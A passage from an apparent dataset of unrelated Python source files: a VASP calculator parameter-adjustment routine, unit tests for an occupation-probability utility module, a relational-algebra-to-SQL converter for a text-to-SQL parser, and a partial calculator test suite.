confirm environment variables are set\n    if custodian:\n        # Return the command flag\n        run_vasp_custodian_file = os.path.abspath(inspect.getfile(custodian_vasp))\n        command = f\"python {run_vasp_custodian_file}\"\n    else:\n        if \"ASE_VASP_COMMAND\" not in os.environ and \"VASP_SCRIPT\" not in os.environ:\n            warnings.warn(\n                \"ASE_VASP_COMMAND or VASP_SCRIPT must be set in the environment to run VASP. See the ASE Vasp calculator documentation for details.\"\n            )\n        command = None\n\n    return command\n\n\ndef _remove_unused_flags(user_calc_params: Dict[str, Any]) -> Dict[str, Any]:\n    \"\"\"\n    Removes unused flags in the INCAR, like EDIFFG if you are doing NSW = 0.\n\n    Parameters\n    ----------\n    user_calc_params\n        User-specified calculation parameters\n\n    Returns\n    -------\n    Dict\n        Adjusted user-specified calculation parameters\n    \"\"\"\n\n    # Turn off opt flags if NSW = 0\n    opt_flags = (\"ediffg\", \"ibrion\", \"isif\", \"potim\", \"iopt\")\n    if user_calc_params.get(\"nsw\", 0) == 0:\n        for opt_flag in opt_flags:\n            user_calc_params.pop(opt_flag, None)\n\n    # Turn off +U flags if +U is not even used\n    ldau_flags = (\n        \"ldau\",\n        \"ldauu\",\n        \"ldauj\",\n        \"ldaul\",\n        \"ldautype\",\n        \"ldauprint\",\n        \"ldau_luj\",\n    )\n    if not user_calc_params.get(\"ldau\", False) and not user_calc_params.get(\n        \"ldau_luj\", None\n    ):\n        for ldau_flag in ldau_flags:\n            user_calc_params.pop(ldau_flag, None)\n\n    return user_calc_params\n\n\ndef _calc_swaps(\n    atoms: Atoms,\n    user_calc_params: Dict[str, Any],\n    auto_kpts: None\n    | Dict[str, float]\n    | Dict[str, List[Tuple[float, float]]]\n    | Dict[str, List[Tuple[float, float, float]]],\n    verbose: bool = True,\n) -> Dict[str, Any]:\n    \"\"\"\n    Swaps out bad INCAR flags.\n\n    Parameters\n    ----------\n    .Atoms\n        Atoms object\n    user_calc_params\n        User-specified calculation parameters\n    auto_kpts\n        The automatic k-point scheme dictionary\n    verbose\n        Whether to print out any time the input flags are adjusted.\n\n    Returns\n    -------\n    Dict[str,Any]\n        Dictionary of new user-specified calculation parameters\n    \"\"\"\n    is_metal = check_is_metal(atoms)\n    max_block = get_highest_block(atoms)\n    calc = Vasp_(**user_calc_params)\n\n    if (\n        not calc.int_params[\"lmaxmix\"] or calc.int_params[\"lmaxmix\"] < 6\n    ) and max_block == \"f\":\n        if verbose:\n            warnings.warn(\"Copilot: Setting LMAXMIX = 6 because you have an f-element.\")\n        calc.set(lmaxmix=6)\n    elif (\n        not calc.int_params[\"lmaxmix\"] or calc.int_params[\"lmaxmix\"] < 4\n    ) and max_block == \"d\":\n        if verbose:\n            warnings.warn(\"Copilot: Setting LMAXMIX = 4 because you have a d-element\")\n        calc.set(lmaxmix=4)\n\n    if (\n        calc.bool_params[\"luse_vdw\"]\n        or calc.bool_params[\"lhfcalc\"]\n        or calc.bool_params[\"ldau\"]\n        or calc.dict_params[\"ldau_luj\"]\n        or calc.string_params[\"metagga\"]\n    ) and not calc.bool_params[\"lasph\"]:\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting LASPH = True because you have a +U, vdW, meta-GGA, or hybrid calculation.\"\n            )\n        calc.set(lasph=True)\n\n    if (\n        calc.bool_params[\"lasph\"]\n        and (not calc.int_params[\"lmaxtau\"] or calc.int_params[\"lmaxtau\"] < 8)\n        and max_block == \"f\"\n    ):\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting LMAXTAU = 8 because you have LASPH = True and an f-element.\"\n            )\n        calc.set(lmaxtau=8)\n\n    if calc.string_params[\"metagga\"] and (\n        not calc.string_params[\"algo\"] or calc.string_params[\"algo\"].lower() != \"all\"\n    ):\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting ALGO = All because you have a meta-GGA calculation.\"\n            )\n        calc.set(algo=\"all\")\n\n    if calc.bool_params[\"lhfcalc\"] and (\n        not calc.string_params[\"algo\"]\n        or calc.string_params[\"algo\"].lower() not in [\"all\", \"damped\"]\n    ):\n        if is_metal:\n            calc.set(algo=\"damped\", time=0.5)\n            if verbose:\n                warnings.warn(\n                    \"Copilot: Setting ALGO = Damped, TIME = 0.5 because you have a hybrid calculation with a metal.\"\n                )\n        else:\n            calc.set(algo=\"all\")\n            if verbose:\n                warnings.warn(\n                    \"Copilot: Setting ALGO = All because you have a hybrid calculation.\"\n                )\n\n    if (\n        is_metal\n        and (calc.int_params[\"ismear\"] and calc.int_params[\"ismear\"] < 0)\n        and (calc.int_params[\"nsw\"] and calc.int_params[\"nsw\"] > 0)\n    ):\n        if verbose:\n            warnings.warn(\n                \"Copilot: You are relaxing a likely metal. Setting ISMEAR = 1 and SIGMA = 0.1.\"\n            )\n        calc.set(ismear=1, sigma=0.1)\n\n    if (\n        calc.int_params[\"nedos\"]\n        and calc.int_params[\"ismear\"] != -5\n        and calc.int_params[\"nsw\"] in (None, 0)\n    ):\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting ISMEAR = -5 because you have a static DOS calculation.\"\n            )\n        calc.set(ismear=-5)\n\n    if (\n        calc.int_params[\"ismear\"] == -5\n        and np.product(calc.kpts) < 4\n        and calc.float_params[\"kspacing\"] is None\n    ):\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting ISMEAR = 0 because you don't have enough k-points for ISMEAR = -5.\"\n            )\n        calc.set(ismear=0)\n\n    if (\n        auto_kpts\n        and auto_kpts.get(\"line_density\", None)\n        and calc.int_params[\"ismear\"] != 0\n    ):\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting ISMEAR = 0 and SIGMA = 0.01 because you are doing a line mode calculation.\"\n            )\n        calc.set(ismear=0, sigma=0.01)\n\n    if calc.int_params[\"ismear\"] == -5 and (\n        not calc.float_params[\"sigma\"] or calc.float_params[\"sigma\"] > 0.05\n    ):\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting SIGMA = 0.05 because ISMEAR = -5 was requested with SIGMA > 0.05.\"\n            )\n        calc.set(sigma=0.05)\n\n    if (\n        calc.float_params[\"kspacing\"]\n        and (calc.float_params[\"kspacing\"] and calc.float_params[\"kspacing\"] > 0.5)\n        and calc.int_params[\"ismear\"] == -5\n    ):\n        if verbose:\n            warnings.warn(\n                \"Copilot: KSPACING is likely too large for ISMEAR = -5. Setting ISMEAR = 0.\"\n            )\n        calc.set(ismear=0)\n\n    if (\n        calc.int_params[\"nsw\"]\n        and calc.int_params[\"nsw\"] > 0\n        and calc.bool_params[\"laechg\"]\n    ):\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting LAECHG = False because you have NSW > 0. LAECHG is not compatible with NSW > 0.\"\n            )\n        calc.set(laechg=False)\n\n    if calc.int_params[\"ldauprint\"] in (None, 0) and (\n        calc.bool_params[\"ldau\"] or calc.dict_params[\"ldau_luj\"]\n    ):\n        if verbose:\n            warnings.warn(\"Copilot: Setting LDAUPRINT = 1 because LDAU = True.\")\n        calc.set(ldauprint=1)\n\n    if calc.special_params[\"lreal\"] and calc.int_params[\"nsw\"] in (None, 0, 1):\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting LREAL = False because you are running a static calculation. LREAL != False can be bad for energies.\"\n            )\n        calc.set(lreal=False)\n\n    if not calc.int_params[\"lorbit\"] and (\n        calc.int_params[\"ispin\"] == 2\n        or np.any(atoms.get_initial_magnetic_moments() != 0)\n    ):\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting LORBIT = 11 because you have a spin-polarized calculation.\"\n            )\n        calc.set(lorbit=11)\n\n    if (\n        (calc.int_params[\"ncore\"] and calc.int_params[\"ncore\"] > 1)\n        or (calc.int_params[\"npar\"] and calc.int_params[\"npar\"] > 1)\n    ) and (\n        calc.bool_params[\"lhfcalc\"] is True\n        or calc.bool_params[\"lrpa\"] is True\n        or calc.bool_params[\"lepsilon\"] is True\n        or calc.int_params[\"ibrion\"] in [5, 6, 7, 8]\n    ):\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting NCORE = 1 because NCORE/NPAR is not compatible with this job type.\"\n            )\n        calc.set(ncore=1)\n        calc.set(npar=None)\n\n    if (\n        (calc.int_params[\"ncore\"] and calc.int_params[\"ncore\"] > 1)\n        or (calc.int_params[\"npar\"] and calc.int_params[\"npar\"] > 1)\n    ) and len(atoms) <= 4:\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting NCORE = 1 because you have a very small structure.\"\n            )\n        calc.set(ncore=1)\n        calc.set(npar=None)\n\n    if (\n        calc.int_params[\"kpar\"]\n        and calc.int_params[\"kpar\"] > np.prod(calc.kpts)\n        and calc.float_params[\"kspacing\"] is None\n    ):\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting KPAR = 1 because you have too few k-points to parallelize.\"\n            )\n        calc.set(kpar=1)\n\n    if (\n        calc.int_params[\"nsw\"]\n        and calc.int_params[\"nsw\"] > 0\n        and calc.int_params[\"isym\"]\n        and calc.int_params[\"isym\"] > 0\n    ):\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting ISYM = 0 because you are running a relaxation.\"\n            )\n        calc.set(isym=0)\n\n    if calc.bool_params[\"lhfcalc\"] is True and calc.int_params[\"isym\"] in (1, 2):\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting ISYM = 3 because you are running a hybrid calculation.\"\n            )\n        calc.set(isym=3)\n\n    if calc.bool_params[\"lsorbit\"]:\n        if verbose:\n            warnings.warn(\n                \"Copilot: Setting ISYM = -1 because you are running a SOC calculation.\"\n            )\n        calc.set(isym=-1)\n\n    if calc.bool_params[\"luse_vdw\"] and \"ASE_VASP_VDW\" not in os.environ:\n        warnings.warn(\"ASE_VASP_VDW was not set, yet you requested a vdW functional.\")\n\n    return calc.parameters\n", "311": "\"\"\"\nUnit and regression tests for the occuprob.utils module.\n\"\"\"\n\nimport pytest\n\nimport numpy as np\n\nfrom occuprob.utils import calc_beta\nfrom occuprob.utils import calc_geometric_mean\nfrom occuprob.utils import calc_exponent\nfrom occuprob.utils import compare_numpy_dictionaries\n\n\ndef test_calc_beta():\n    \"\"\" Unit test for the calc_beta function.\"\"\"\n\n    temperature = np.array([0., 11604.5181216])\n\n    expected_beta = np.array([np.inf, 1.])\n    calculated_beta = calc_beta(temperature)\n\n    assert pytest.approx(calculated_beta) == expected_beta\n\n\ndef test_calc_geometric_mean():\n    \"\"\" Unit test for the calc_geometric_mean function.\"\"\"\n\n    input_array = np.array([[0., 0.], [1., 1.], [2., 2.], [3., 3.]])\n\n    calculated_gmean = calc_geometric_mean(input_array)\n\n    expected_gmean = np.array([0., 1., 2., 3.])\n    print(calculated_gmean)\n\n    assert pytest.approx(calculated_gmean) == expected_gmean\n\n\ndef test_calc_exponent():\n    \"\"\" Unit test for the calc_exponent function.\"\"\"\n\n    energy = np.array([0., 1.])\n    temperature = np.array([0., 11604.518121, 23209.036242])\n\n    expected_exponent = np.array([[0., 0., 0.], [np.inf, 1., 0.5]])\n    calculated_exponent = calc_exponent(energy, temperature)\n\n    assert pytest.approx(calculated_exponent) == expected_exponent\n\n\ndef test_compare_numpy_dictionaries():\n    \"\"\" Unit test for the compare_numpy_dictionaries function. \"\"\"\n\n    dict1 = {1: np.zeros((2, 2)), 2: np.ones((2, 2))}\n    dict2 = {1: np.zeros((2, 2)), 2: np.ones((2, 2))}\n    dict3 = {1: np.ones((2, 2)), 2: np.zeros((2, 2))}\n    dict4 = {0: np.ones((2, 2)), 1: np.zeros((2, 2))}\n\n    assert compare_numpy_dictionaries(dict1, dict2)\n    assert not compare_numpy_dictionaries(dict1, dict3)\n    assert not compare_numpy_dictionaries(dict3, dict4)\n", "312": "from functools import reduce\nfrom itertools import *\nfrom anytree import Node\nimport copy\nfrom anytree.search import *\nimport re\nimport smbop.utils.node_util as node_util\nimport logging\n\n\nelse_dict = {\n    \"Selection\": \" WHERE \",\n    \"SELECTION\": \" WHERE \",\n    \"Groupby\": \" GROUP BY \",\n    \"GROUPBY\": \" GROUP BY \",\n    \"Limit\": \" LIMIT \",\n    \"LIMIT\": \" LIMIT \",\n    \"Having\": \" HAVING \",\n    \"HAVING\": \" HAVING \",\n}\n\nvalue_binary_op_dict = {\n    'add': ' + ',\n    'sub': ' - ',\n    'mul': ' * ',\n    'div': ' / ',\n}\n\npred_dict = {\n    \"eq\": \" = \",\n    \"EQ\": \" = \",\n    \"like\": \" LIKE \",\n    \"LIKE\": \" LIKE \",\n    \"nlike\": \" NOT LIKE \",\n    \"NLIKE\": \" NOT LIKE \",\n    \"nin\": \" NOT IN \",\n    \"NIN\": \" NOT IN \",\n    \"lte\": \" <= \",\n    \"LTE\": \" <= \",\n    \"lt\": \" < \",\n    \"LT\": \" < \",\n    \"neq\": \" != \",\n    \"NEQ\": \" != \",\n    \"in\": \" IN \",\n    \"IN\": \" IN \",\n    \"gte\": \" >= \",\n    \"GTE\": \" >= \",\n    \"gt\": \" > \",\n    \"GT\": \" > \",\n    \"And\": \" AND \",\n    \"AND\": \" AND \",\n    \"Or\": \" OR \",\n    \"OR\": \" OR \",\n    \"except\": \" EXCEPT \",\n    \"EXCEPT\": \" EXCEPT \",\n    \"union\": \" UNION \",\n    \"UNION\": \" UNION \",\n    \"intersect\": \" INTERSECT \",\n    \"INTERCECT\": \" INTERSECT \",\n    \"Val_list\": \" , \",\n    \"VAL_LIST\": \" , \",\n    \"Product\": \" , \",\n    \"PRODUCT\": \" , \"\n}\n\n\ndef wrap_and(x):\n    return [Node(\"And\", children=x)] if len(x) > 1 else x\n\n\ndef fix_between(inp):\n    inp = re.sub(r\"([\\s|\\S]+) >= (\\d*) AND \\1 <= (\\d*)\", r\"\\1 BETWEEN \\2 and \\3\", inp)\n    # DuSQL\u4e2d\u7684LIKE\u6761\u4ef6\u503c\u6ca1\u6709\u89c4\u8303\u5316\u4e3a% %\u7684\u5f62\u5f0f\n    # inp = re.sub(r\"LIKE '([\\s|\\S]+?)'\", r\"LIKE '%\\1%'\", inp)\n    return inp\n\n\nclass Item:\n    def __init__(self, curr_type, l_child_idx, r_child_idx, mask):\n        self.curr_type = curr_type\n        self.l_child_idx = l_child_idx\n        self.r_child_idx = r_child_idx\n        self.mask = mask\n\n\nclass ZeroItem:\n    def __init__(\n        self,\n        curr_type,\n        final_leaf_indices,\n        span_start_indices,\n        span_end_indices,\n        entities,\n        enc_original,\n        tokenizer,\n        db_id,\n    ):\n        self.curr_type = curr_type\n        self.final_leaf_indices = final_leaf_indices\n        self.span_start_indices = span_start_indices\n        self.span_end_indices = span_end_indices\n        self.entities = entities\n        self.enc_original = enc_original\n        self.tokenizer = tokenizer\n        self.db_id = db_id\n\n\ndef reconstruct_tree(\n    op_names, binary_op_count, batch_el, idx, items, cnt, num_schema_leafs\n):\n    type_data = int(items[cnt].curr_type[batch_el][idx])\n    tuple_el = Node(op_names[type_data])\n    if cnt > 0:\n        if type_data < binary_op_count:\n            l_idx = items[cnt].l_child_idx[batch_el][idx]\n            r_idx = items[cnt].r_child_idx[batch_el][idx]\n\n            l_child = reconstruct_tree(\n                op_names,\n                binary_op_count,\n                batch_el,\n                l_idx,\n                items,\n                cnt - 1,\n                num_schema_leafs,\n            )\n            r_child = reconstruct_tree(\n                op_names,\n                binary_op_count,\n                batch_el,\n                r_idx,\n                items,\n                cnt - 1,\n                num_schema_leafs,\n            )\n            tuple_el.children = [l_child, r_child]\n        else:\n            idx = items[cnt].l_child_idx[batch_el][idx]\n            child = reconstruct_tree(\n                op_names,\n                binary_op_count,\n                batch_el,\n                idx,\n                items,\n                cnt - 1,\n                num_schema_leafs,\n            )\n            tuple_el.children = [child]\n    else:\n        num_schema_leafs = min(num_schema_leafs, items[cnt].final_leaf_indices[batch_el].shape[0])\n        if idx < num_schema_leafs:\n            entities = items[cnt].entities[batch_el]\n            entity_idx = items[cnt].final_leaf_indices[batch_el][idx]\n            tuple_el.val = entities[entity_idx]\n            if '_table_' in entities:\n                table_name = f'Table_{items[cnt].db_id[batch_el]}'\n                if tuple_el.val == '_table_':\n                    tuple_el.val = table_name\n                elif entity_idx >= entities.index('*'):\n                    tuple_el.val = f'{table_name}.{tuple_el.val}'\n        else:\n            span_idx = idx - num_schema_leafs\n            enc_tokens = items[cnt].enc_original[batch_el][1:].tolist() # \u628a\u5f00\u5934\u53bb\u6389\u4e86\n            enc_tokens = [x.text for x in enc_tokens]\n            start_id = items[cnt].span_start_indices[batch_el][span_idx]\n            end_id = items[cnt].span_end_indices[batch_el][span_idx]\n            # BERT\u7cfb\u5217\u7684tokenizer\u5728decode\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u52a0\u7a7a\u683c\n            if 'bert' in items[cnt].tokenizer.name_or_path:\n                token_list = []\n                for token in enc_tokens[start_id : end_id + 1]:\n                    # \u5c06token\u4e2d\u7684## \u53bb\u6389\n                    token = token.replace('##', '').replace('\u2581', '')\n                    token_list.append(token)\n                tuple_el.val = (\n                    ''.join(token_list)\n                )\n            else:\n                tuple_el.val = (\n                    ''.join(enc_tokens[start_id : end_id + 1])\n                )\n    return tuple_el\n\n\ndef remove_keep(node: Node):\n    if node.name == \"keep\":\n        node = remove_keep(node.children[0])\n    node.children = [remove_keep(child) for child in node.children]\n    return node\n\n\ndef promote(node, root=False):\n    children = node.children\n    if node.name in [\"Having\"]:\n        while True:\n            if not node.is_root and node.parent.name not in [\n                \"union\",\n                \"intersect\",\n                \"Subquery\",\n                \"except\",\n            ]:\n                prev_parent = node.parent\n                grandparent = (\n                    prev_parent.parent if not prev_parent.is_root else prev_parent\n                )\n                node.parent = grandparent\n            else:\n                break\n        node.siblings[0].parent = node\n    for child in children:\n        promote(child)\n\n\ndef flatten_cnf(in_node):\n    if in_node.name in [\"And\", \"Or\", \"Val_list\", \"Product\"]:\n        return flatten_cnf_recurse(in_node, in_node.name, is_root=True)\n    else:\n        children_list = []\n        for child in in_node.children:\n            child.parent = None\n            child = flatten_cnf(child)\n            children_list.append(child)\n        in_node.children = children_list\n        return in_node\n\n\ndef flatten_cnf_recurse(in_node, n_type, is_root=False):\n    other_op = \"And\" if n_type == \"Or\" else \"Or\"\n    if in_node.name == n_type:\n        res = []\n        for child in in_node.children:\n            child.parent = None\n            res += flatten_cnf_recurse(child, n_type)\n        if is_root:\n            in_node.children = res\n            return in_node\n        else:\n            return res\n    elif in_node.name == other_op:\n        return [flatten_cnf_recurse(in_node, other_op, True)]\n    else:\n        if not is_root:\n            children_list = []\n            for child in in_node.children:\n                child.parent = None\n                child = flatten_cnf(child)\n                children_list.append(child)\n            in_node.children = children_list\n        return [in_node]\n\n\ndef irra_to_sql(tree, peren=True, is_row_calc=False, alias=None):\n    if len(tree.children) == 0:\n        if tree.name == \"Table\" and isinstance(tree.val, dict):\n            return tree.val[\"value\"] + \" AS \" + tree.val[\"name\"]\n        if hasattr(tree, \"val\"):\n            if is_row_calc and '.' in str(tree.val) and alias is not None:\n                _, column_name = str(tree.val).split('.')\n                column_name = alias + '.' + column_name\n                return column_name\n            else:\n                return str(tree.val)\n        else:\n            print(tree)\n            return \"\"\n    if len(tree.children) == 1:\n        if tree.name in [\n            \"min\",\n            \"count\",\n            \"max\",\n            \"avg\",\n            \"sum\",\n        ]:\n            return \"\".join(\n                [tree.name.upper(), \" ( \", irra_to_sql(tree.children[0], is_row_calc=is_row_calc), \" )\"]\n            )\n        elif tree.name == \"distinct\":\n            return \"DISTINCT \" + irra_to_sql(tree.children[0], is_row_calc=is_row_calc)\n        elif tree.name == \"literal\":\n            return \"\"\"\\'\"\"\" + str(irra_to_sql(tree.children[0], is_row_calc=is_row_calc)) + \"\"\"\\'\"\"\"\n        elif tree.name == \"Subquery\":\n            if peren:\n                parsed = \"\".join([\"(\", irra_to_sql(tree.children[0], is_row_calc=is_row_calc), \")\"])\n                if is_row_calc and alias is not None:\n                    parsed = parsed + ' ' + alias\n                return parsed\n            else:\n                parsed = irra_to_sql(tree.children[0], is_row_calc=is_row_calc)\n                if is_row_calc and alias is not None:\n                    parsed = parsed + ' ' + alias\n                return parsed\n        elif tree.name == \"Join_on\":\n            tree = tree.children[0]\n            if tree.name == \"eq\":\n                first_table_name = tree.children[0].val.split(\".\")[0]\n                second_table_name = tree.children[1].val.split(\".\")[0]\n                return f\"{first_table_name} JOIN {second_table_name} ON {tree.children[0].val} = {tree.children[1].val}\"\n            else:\n                if len(tree.children) > 0:\n                    try:\n                        t_Res = \", \".join([child.val for child in tree.children])\n                    except Exception as e:\n                        logging.exception(e)\n                        raise e\n                    return t_Res\n                else:\n                    return tree.val\n        else:  # Predicate or Table or 'literal' or Agg\n            return irra_to_sql(tree.children[0], is_row_calc=is_row_calc, alias=alias)\n    else:\n        if tree.name in [\n            \"eq\",\n            \"like\",\n            \"nin\",\n            \"lte\",\n            \"lt\",\n            \"neq\",\n            \"in\",\n            \"gte\",\n            \"gt\",\n            \"And\",\n            \"Or\",\n            \"except\",\n            \"union\",\n            \"intersect\",\n            \"Product\",\n            \"Val_list\",\n        ]:\n            pren_t = tree.name in [\n                \"eq\",\n                \"like\",\n                \"nin\",\n                \"lte\",\n                \"lt\",\n                \"neq\",\n                \"in\",\n                \"gte\",\n                \"gt\",\n            ]\n            if tree.name == 'Product':\n                if len(tree.children[0].children) == 1 and len(tree.children[1].children) == 1 and tree.children[0].children[0].name == 'Subquery' and tree.children[1].children[0].name == 'Subquery':\n                    return (\n                        pred_dict[tree.name].upper()\n                        .join([\n                            irra_to_sql(tree.children[0], pren_t, is_row_calc=is_row_calc, alias='a'),\n                            irra_to_sql(tree.children[1], pren_t, is_row_calc=is_row_calc, alias='b'),\n                        ])\n                    )\n            return (\n                pred_dict[tree.name]\n                .upper()\n                .join([irra_to_sql(child, pren_t, is_row_calc=is_row_calc) for child in tree.children])\n            )\n        elif tree.name in value_binary_op_dict.keys():\n            # \u6b64\u65f6\u51fa\u73b0\u5217 \u6216 \u5e38\u91cf\u7684\u56db\u5219\u8fd0\u7b97\n            if hasattr(tree.children[0], 'val') and hasattr(tree.children[1], 'val') and tree.children[0].val == tree.children[1].val:\n                return (\n                    irra_to_sql(tree.children[0], is_row_calc=is_row_calc, alias='a')\n                    + value_binary_op_dict[tree.name]\n                    + irra_to_sql(tree.children[1], is_row_calc=is_row_calc, alias='b')\n                )\n            else:\n                return (\n                    irra_to_sql(tree.children[0], is_row_calc=is_row_calc)\n                    + value_binary_op_dict[tree.name]\n                    + irra_to_sql(tree.children[1], is_row_calc=is_row_calc)\n                )\n        elif tree.name == \"Orderby_desc\":\n            return (\n                irra_to_sql(tree.children[1], is_row_calc=is_row_calc)\n                + \" ORDER BY \"\n                + irra_to_sql(tree.children[0], is_row_calc=is_row_calc)\n                + \" DESC\"\n            )\n        elif tree.name == \"Orderby_asc\":\n            return (\n                irra_to_sql(tree.children[1], is_row_calc=is_row_calc)\n                + \" ORDER BY \"\n                + irra_to_sql(tree.children[0], is_row_calc=is_row_calc)\n                + \" ASC\"\n            )\n        elif tree.name == \"Project\":\n            return (\n                \"SELECT \"\n                + irra_to_sql(tree.children[0], is_row_calc=is_row_calc)\n                + \" FROM \"\n                + irra_to_sql(tree.children[1], is_row_calc=is_row_calc)\n            )\n        elif tree.name == \"Join_on\":\n            # tree\n            def table_name(x):\n                return x.val.split(\".\")[0]\n\n            table_tups = [\n                (table_name(child.children[0]), table_name(child.children[1]))\n                for child in tree.children\n            ]\n            res = table_tups[0][0]\n            seen_tables = set(res)\n            for (first, sec), child in zip(table_tups, tree.children):\n                tab = first if sec in seen_tables else sec\n                res += (\n                    f\" JOIN {tab} ON {child.children[0].val} = {child.children[1].val}\"\n                )\n                seen_tables.add(tab)\n\n            return res\n        elif tree.name == \"Selection\":\n            if len(tree.children) == 1:\n                return irra_to_sql(tree.children[0], is_row_calc=is_row_calc)\n            return (\n                irra_to_sql(tree.children[1], is_row_calc=is_row_calc)\n                + \" WHERE \"\n                + irra_to_sql(tree.children[0], is_row_calc=is_row_calc)\n            )\n        else:  # 'Selection'/'Groupby'/'Limit'/Having'\n            return (\n                irra_to_sql(tree.children[1], is_row_calc=is_row_calc)\n                + else_dict[tree.name]\n                + irra_to_sql(tree.children[0], is_row_calc=is_row_calc)\n            )\n\n\ndef ra_to_irra(tree):\n    flat_tree = flatten_cnf(copy.deepcopy(tree))\n    for node in findall(flat_tree, filter_=lambda x: x.name == \"Selection\"):\n        table_node = node.children[1]\n        join_list = []\n        where_list = []\n        having_list = []\n        if node.children[0].name == \"And\":\n            for predicate in node.children[0].children:\n                # Join list\u7684\u5224\u65ad\u5b58\u5728\u95ee\u9898\n                if (\n                    all(node_util.is_field(child) for child in predicate.children)\n                    and predicate.name == \"eq\"\n                ):\n                    join_list.append(predicate)\n                else:\n                    if predicate.name == \"Or\" or all(\n                        child.name in [\"literal\", \"Subquery\", \"Value\", \"Or\", 'add', 'sub', 'div', 'mul', 'Val_list']\n                        for child in predicate.children\n                    ):\n                        where_list.append(predicate)\n                    else:\n                        having_list.append(predicate)\n                predicate.parent = None\n        else:\n            if node.children[0].name == \"eq\" and all(\n                node_util.is_field(child) for child in node.children[0].children\n            ):\n                join_list = [node.children[0]]\n            elif node.children[0].name == \"Or\":\n                where_list = [node.children[0]]\n            else:\n                if all(\n                    child.name in [\"literal\", \"Subquery\", \"Value\", \"Or\", 'add', 'sub', 'div', 'mul', 'Val_list']\n                    for child in node.children[0].children\n                ):\n                    where_list = [node.children[0]]\n                else:\n                    having_list = [node.children[0]]\n            node.children[0].parent = None\n        having_node = (\n            [Node(\"Having\", children=wrap_and(having_list))] if having_list else []\n        )\n        join_on = Node(\"Join_on\", children=join_list)\n        if len(join_on.children) == 0:\n            join_on.children = [table_node]\n        node.children = having_node + wrap_and(where_list) + [join_on]\n    flat_tree = Node(\"Subquery\", children=[flat_tree])\n    promote(flat_tree)\n    return flat_tree.children[0]\n\ndef if_row_calc(tree):\n    if tree.name == 'Product':\n        l_child = tree.children[0]\n        r_child = tree.children[1]\n        if len(l_child.children) == 1 and len(r_child.children) == 1 and l_child.children[0].name == 'Subquery' and r_child.children[0].name == 'Subquery':\n            return True\n    \n    if len(tree.children) == 0:\n        return False\n    return any([if_row_calc(x) for x in tree.children])\n\ndef ra_to_sql(tree):\n    if tree:\n        tree = remove_keep(tree)\n        is_row_calc = if_row_calc(tree)\n        irra = ra_to_irra(tree)\n        sql = irra_to_sql(irra, is_row_calc=is_row_calc)\n        # No Need in dusql\n        # sql = fix_between(sql)\n        sql = sql.replace(\"LIMIT value\", \"LIMIT 1\")\n        return sql\n    else:\n        return \"\"\n", "313": "", "314": "import unittest\nfrom myCalculator import MyCalculator\n\nclass myCalculatorTest(unittest.TestCase):\n    \n    def test_addTwoNumbers(self):\n        my_calc = MyCalculator()\n        self.assertEqual(0, my_calc.addTwoNumbers(0, 0))\n        self.assertEqual(0, my_calc.addTwoNumbers(-3, 3))\n        self.assertEqual(0, my_calc.addTwoNumbers(3, -3))\n        self.assertEqual(-1, my_calc.addTwoNumbers(2, -3))\n        self.assertEqual(5, my_calc.addTwoNumbers(2, 3))\n        self.assertEqual(-3, my_calc.addTwoNumbers(0, -3))\n        \n    def test_subtractTwoNumbers(self):\n        my_calc = MyCalculator()\n        self.assertEqual(0, my_calc.subtractTwoNumbers(2, 2))\n        self.assertEqual(0, my_calc.subtractTwoNumbers(-2, -2))\n        self.assertEqual(3, my_calc.subtractTwoNumbers(1, -2))\n        self.assertEqual(5, my_calc.subtractTwoNumbers(7, 2))\n        self.assertEqual(0, my_calc.subtractTwoNumbers(0, 0))\n        \n    def test_multipleTwoNumbers(self):\n         my_calc = MyCalculator()\n         self.assertEqual(0, my_calc.multipleTwoNumbers(0,0))\n         self.assertEqual(0, my_calc.multipleTwoNumbers(0,5))\n         self.assertEqual(0, my_calc.multipleTwoNumbers(2,0))\n         self.assertEqual(25, my_calc.multipleTwoNumbers(5,5))\n         self.assertEqual(4, my_calc.multipleTwoNumbers(-2,-2))\n         self.assertEqual(0.5, my_calc.multipleTwoNumbers(0.5,1))\n         \n         \n    def test_division(self):\n        my_calc = MyCalculator()\n        self.assertEqual(2.5, my_calc.division(5,2))\n        self.assertEqual(4, my_calc.division(2,0.5))\n        self.assertEqual(2.5, my_calc.division(5,2))\n        self.assertEqual(-2.5, my_calc.division(-5,2))\n        self.assertEqual(2, my_calc.division(-6,-3))\n        \n    def test_factorial(self):\n        my_calc = MyCalculator()\n        self.assertEqual(24, my_calc.factorial(4))\n        self.assertEqual(120, my_calc.factorial(5))\n    \n    def test_combination(self):\n        my_calc = MyCalculator()\n        self.assertEqual(252, my_calc.combination(10,5))\n        self.assertEqual(1, my_calc.combination(10,0))\n        self.assertEqual(1, my_calc.combination(0,0))\n        \n    def test_permutation(self):\n        my_calc = MyCalculator()\n        self.assertEqual(30240, my_calc.permutation(10,5))\n        self.assertEqual(1, my_calc.permutation(10,0))\n        self.assertEqual(1, my_calc.permutation(0,0))\n        self.assertEqual(90, my_calc.permutation(10,2))\n        \n    def test_square(self):\n        my_calc = MyCalculator()\n        self.assertEqual(0, my_calc.square(0))\n        self.assertEqual(4, my_calc.square(2))\n        self.assertEqual(4, my_calc.square(-2))\n        self.assertEqual(25, my_calc.square(5))\n        \n    def test_squareRoot(self):\n        my_calc = MyCalculator()\n        self.assertEqual(0, my_calc.squareRoot(0))\n        self.assertEqual(1, my_calc.squareRoot(1))\n        self.assertEqual(5, my_calc.squareRoot(25))\n        self.assertEqual(2.5, my_calc.squareRoot(6.25))\n        \n    def test_cube(self):\n        my_calc = MyCalculator()\n        self.assertEqual(0, my_calc.cube(0))\n        self.assertEqual(1, my_calc.cube(1))\n        self.assertEqual(-1, my_calc.cube(-1))\n        self.assertEqual(27, my_calc.cube(3))\n        self.assertEqual(3.375, my_calc.cube(1.5))\n        \n    def test_cubeRoot(self):\n        